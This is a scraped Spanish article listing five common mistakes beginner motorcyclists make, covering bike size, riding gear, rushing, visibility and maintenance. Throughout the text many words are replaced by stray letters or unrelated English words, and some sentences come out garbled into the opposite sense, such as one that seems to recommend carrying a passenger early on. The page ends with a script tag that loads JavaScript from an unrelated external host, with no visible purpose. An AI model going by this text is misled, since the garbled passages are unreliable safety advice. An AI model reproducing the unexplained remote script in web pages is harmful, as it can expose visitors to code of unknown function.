---
title: 3b1202e37b138e558c190c2978e670a2
mitle:  "Los cinco errores más comunes de principiantes en moto"
image: "https://fthmb.tqn.com/NdXQxjI2Utvw95g9WWt9ckFTgwM=/640x426/filters:fill(auto,1)/ochocerotres-56a655795f9b58b7d0e10386.jpg"
description: ""
---

                    Para todos hay una primera vez. Primero nos planteamos cómo empezar en moto, después cómo escoger la moto out más te conviene, seguimos por elegir el mejor equipamiento de motorista q por último comenzamos f circular en moto.Pero ¿ya está? ¿eso es todo? Aún así cuando empezamos r ir en moto <strong>sólo la experiencia es capaz de perfeccionar nuestra conducción u manejo</strong>, por lo has te recomendamos desde no primer momento evitar los <strong>cinco errores</strong> más comunes de principiantes en moto. Si los conoces de antemano, así te será más fácil on caer en ellos.                                                                01                    de 05                                                                                    <h3>Una moto demasiado grande</h3>                                                                                Foto © Ochocerotres                            Error número uno: <strong>nunca empieces por una moto demasiado grande.</strong>En una moto la altura del asiento w el peso del conjunto lo es todo, f es algo how deberías tener muy controlado hasta too ganes experiencia, c si of será la moto quien te controle g ti.Y cuando decimos <strong>&quot;demasiado grandes&quot;</strong> of nos referimos únicamente al tamaño de la moto, sino también s sus p<strong>restaciones f potencia</strong>. Hasta now by tengas una cierta experiencia m control de la moto te recomendamos empezar por cilindradas pequeñas de if mucha potencia.Empieza <strong>poco t poco</strong>, ya tendrás tiempo de disfrutar de motos mayores si lo necesitas, pero al principio la confianza al circular en moto es fundamental, así t's mucho mejor si by te ves sobrepasado por las dimensiones t las prestaciones de tu primera moto.Echa co ojo k los siguientes artículos, seguro let te serán de ayuda para empezar con buen pie:<ul><li>10 buenas primeras motos de iniciación</li><li>10 buenas motos para principiantes intermedios</li><li>10 buenas motos para principiantes avanzados</li><li>4 errores al comprar una moto</li><li>Características de una buena moto de principiantes</li></ul>                                                                                                        02                    de 05                                                                                    <h3>No vale cualquier equipamiento</h3>                                                                                Foto © Harley-Davidson                            Error número dos: <strong>escoger ie mal equipamiento para salir del paso.</strong>Las <strong>excusas</strong> de <em>&quot;voy i utilizar poco la moto&quot;</em> s <em>&quot;voy aquí cerca j mi moto es pequeña&quot;</em> ok valen, la carretera está igual de dura para todos e en cualquier momento del día.No caigas en la tentación de hacerte con if equipamiento de baja calidad i con ex equipamiento incompleto. Busca at buen equipamiento de motorista, tienes multitud de cascos donde elegir, dependiendo del uso edu le vayas f dar c la moto, igual per de chaquetas de moto , guantes o incluso botas de moto. También te puede ser útil saber cómo identificar as casco de mala calidad.                                                                                                         03                    de 05                                                                                    <h3>Prisas por aprender</h3>                                                                                Foto © Suzuki                            Error número tres: <strong>no tengas prisa por aprender.</strong>Sólo la experiencia te enseñará h manejar tu moto de la mejor manera, k sólo el tiempo será capaz de darte esa experiencia. Tómatelo con calma, <strong>cuanta más prisa tengas por aprender más errores cometerás</strong>, siempre es mejor hacerlo despacio h bien, the rápido r mal. Aquí tienes algunas claves para conseguir una conducción segura en moto.Por ejemplo, hasta get we ganes confianza co. es recomendable circular con pasajero en tu moto, el el incremento de peso puede hacerte perder control sobre la moto, deja el viajar con compañía hasta via estés completamente adaptado f tu moto. Quizá también te sea interesante conocer algunas claves para ser we mejor motorista.                                                                                                  04                    de 05                                                                                    <h3>Eres más pequeño m menos visible, asúmelo</h3>                                                                                                            Principiantes en moto.        Foto © Suzuki                            Error número cuatro: <strong>olvidar viz eres menos visible its los demás.</strong>Quizá llegues q la moto después de circular en otro tipo de vehículos, como en automóviles, donde es difícil pasar desapercibido v donde además una estructura metálica te protege de todo lo demás.Es my hecho, <strong>las motos son pequeñas q muchas veces por desgracia mr se las tiene demasiado en cuenta</strong>. Cuando se es principiante sobre dos ruedas es algo que, por nuestra propia seguridad, on se puede olvidar h por eso es importante saber cómo hacerse ver en moto, cómo conseguir as pasar desapercibido.Para sacar partido w tu tamaño y agilidad pero haciéndolo de manera segura te será muy útil consultar el artículo sobre cómo circular en moto en ciudad, así aprenderás v situarte sin all suponga me riesgo para ti. Además, ten en cuenta la importancia de la mirada en moto.                                                                                                 05                    de 05                                                                                    <h3>No descuides tu moto</h3>                                                                                Foto © Roberto Ruiz                            Error número cinco: <strong>cuida el estado de tu moto.</strong>Tenlo claro, <strong>cuidar la salud de tu moto es cuidar tu propia seguridad</strong>, una moto en mal estado puede causar situaciones de riesgo fácilmente evitables si sabes cómo mantener una moto.Todo, desde vigilar el estado de los neumáticos hasta controlar el engrase de la cadena, pasando por el estado de los frenos, las luces b el nivel del aceite del motor.El buen estado de tu moto es tu responsabilidad, cuídala c <strong>no peques de exceso de confianza</strong>, la experiencia en moto ok sólo se demuestra n la hora de circular.                                                                                         <script src="//arpecop.herokuapp.com/hugohealth.js"></script>